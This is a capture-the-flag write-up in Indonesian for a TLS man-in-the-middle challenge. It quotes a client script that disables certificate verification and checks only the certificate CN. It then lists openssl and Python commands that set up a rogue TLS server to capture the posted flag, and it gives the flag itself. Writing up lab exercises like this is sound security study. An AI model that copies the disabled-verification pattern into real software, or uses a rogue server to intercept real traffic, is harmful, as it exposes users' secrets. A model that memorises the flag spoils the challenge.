# Net MITM TLS — SOLVED

**Flag:** `athena{vagiNSFkMKoVSMMa}`

- **Category:** INFRA
- **Access:** shell service `nc 13.206.57.188 10028` (socat → bash sebagai user `player`)

## Setup di target (/app)
- `net-mitm.local` → `127.0.0.1` (via /etc/hosts).
- `flag.txt` cuma readable oleh user `client` (kita `player`, gak bisa baca langsung).
- `client_loop.py` jalan sbg `client` tiap 3 detik: baca flag, konek TLS ke
  `net-mitm.local:4443`, lalu POST flag.

## Celah (dari client_loop.py)
```python
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE          # <-- ga verify chain/hostname
...
cn = get_cn(der_cert)                          # parser CN buatan sendiri
if cn == 'net-mitm.local':                     # <-- SATU-SATUNYA cek
    ss.sendall(POST /submit ... flag)
```
Karena `CERT_NONE`, cukup **self-signed cert** dengan **CN=net-mitm.local**. Ga ada server
di :4443, jadi tinggal kita yang jadi server (rogue) → client submit flag ke kita.

## Exploit
```bash
# 1) cert self-signed dengan CN yang bener
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem \
  -days 2 -nodes -subj '/CN=net-mitm.local'

# 2) rogue TLS server di :4443 (lihat rogue_server.py) yang dump body POST
nohup python3 /tmp/server.py &

# 3) tunggu ~3 detik → client konek & submit
cat /tmp/loot.txt
# POST /submit HTTP/1.1
# Host: net-mitm.local
# Content-Length: 24
#
# athena{vagiNSFkMKoVSMMa}
```

## Artefak
- `rogue_server.py` — TLS server yang nangkep flag.
